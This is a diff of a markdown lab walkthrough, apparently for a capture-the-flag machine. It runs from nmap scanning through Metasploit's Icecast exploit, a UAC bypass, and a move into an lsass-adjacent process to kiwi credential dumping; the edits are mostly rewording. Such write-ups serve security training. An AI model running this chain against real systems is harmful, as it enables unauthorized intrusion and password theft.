@@ -7,7 +7,7 @@
 <br><br>
 
 ## Reconnaissance
-<p>First We need to Scan all ports and finding open ports:</p> <br>
+<p>First We need to Scan all ports and finding all open ports:</p> <br>
 
 ```bash
 sudo nmap -sS -T4 -p- <target ip>
@@ -21,7 +21,7 @@ The Most Important Ports here:
 - 8000 - HTTP Alterntive 
 
 <br>
-Okay, We need to check from versions:
+Alright, We need to check from versions:
 <br>
 <br>
 
@@ -31,8 +31,8 @@ sudo nmap -sV -T4 -p 445,3389,8000 <target ip>
 ```
 ![Pic](screenshots/02.png)
 
-Okay, We got some useful info:
- - SMB is Runnign on Microsoft Windows 7 - 10
+Alright, We got some useful info:
+ - SMB is Runnign on Microsoft Windows 7
  - The HTTP server is Icecast streaming media server
  - Host Name: DARK-PC
 
@@ -40,11 +40,11 @@ Okay, We got some useful info:
 
 ## Gain Access
 
-Google for vulnerables in Icecast streaming media server:
+Make Googling for vulnerables in Icecast streaming media server:
 - Icecast 2.0.1 and earlier Buffer Overflow via HTTP Headers Allows Remote Code Execution
 - CVSS scores for CVE-2004-1561 (Base Score: 7.5, Exploitability Score: 10, Impact Score: 6.4)
 <br>
-<p>Okay, let's search for a good exploit in Metasploit:</P>
+<p>Alright, let's look for a good exploit in Metasploit-Framework:</P>
 
 ```bash
 sudo msfconsole
@@ -56,7 +56,7 @@ use <path/Of/Exploit>
 
 
 <br>
-<p>Okay, let's configure this exploit:</p>
+<p>Alright, Let's configure this exploit:</p>
 
 ```
 show options
@@ -66,7 +66,7 @@ set LHOST <Your Local IP>
 ![Pic](screenshots/04.png)
 
 <br>
-<p>Now, You just need to run exploite and Congratulation! You have a meterprter shell</p>
+<p>Now, You just need to run exploit and congratulation! You have a remote meterprter shell</p>
 
 ![Pic](screenshots/05.png)
 
@@ -78,7 +78,7 @@ set LHOST <Your Local IP>
 <p>Let's check from our privileges used in the process</p>
 
 <p> 
- Is the process owner administrator?? use getuid command <br>
+ Is the process owner the administrator?? use getuid command <br>
  What is the exact versioin number for OS (build)?? use sysinfo command <br>
  What is the process architecture (x64 or x86)?? <br>
  Use getpid command to know which process is used <br>
@@ -89,9 +89,9 @@ set LHOST <Your Local IP>
 
 <br><br>
 <p>
-Okay! not enough privileges, architecture !!<br>
-The architecture of ths process is x86 bit and the user is not the administrator <br>
-While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`
+Alright, but it's not enough privileges and architecture !!<br>
+The architecture of ths process is x86 bit and the user is not the administrator (Dark) <br>
+While this doesn't work the best on x64 machines, let's now use post/multi/recon/local_exploit_suggester
 </p>
 
 ![Pic](screenshots/07.png)
@@ -106,14 +106,14 @@ Let's use the 2nd exploit: exploit/windows/local/bypassuac_eventvwr
 
 <br><br><p>
 Now Let's check from the new process architecture by gepid and ps commands <br>
-Okay We are using a thread from powershell.exe with better architecture x64 
+Okay, We are using a thread from powershell.exe with better architecture x64 
 </p>
 
 ![Pic](screenshots/09.png)
 
 <br><br><p>
-Now Let's check from the process privileges by usig getprivs command <br>
-Okay we have better privileges from the previous
+Now Let's check the process privileges by usig getprivs command <br>
+Okay we have better privileges but it's not enough yet!
 </p>
 
 ![Pic](screenshots/10.png)
@@ -122,7 +122,7 @@ Okay we have better privileges from the previous
 The Process Owner is Dark-PC\Dark, He doesn't have the enough privileges on the device. <br>
 We need to move to a process that actually has the highest privileges in the current runnign process. <br>
 The best process is lsass.exe service because the service responsible for authentication within Windows. <br>
-But they are high restrictions to access or use this process, so we need to look for a process is allowed to interact with lsass. <br>
+But It has high restrictions to access or to interact with it, so we need to look for a process is allowed to interact with lsass. <br>
 <br>
 In order to interact with lsass:<br>
   1- we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) <br>
@@ -164,7 +164,7 @@ How do we steal a password without Dark being logged in? <br>
 Scheduled Task = A task stored in Windows says "Run this program with this user at a specific time or when the system starts."<br>
 In this case: There is a program called Icecast, Windows runs it under the username Dark.<br>
 When Windows runs a program with a specific username: It needs the password, So it loads it into memory (RAM)<br>
-Even if: - The Dark user is not sitting in front of the device  - And is not opening the session itself<br>
+
 kiwi Doesn't care: Who's logged in<br>
 He just: Reads the memory<br>
 Why did the operation succeed so easily in the leb? Windows Defender and Firewall are not working!<br>
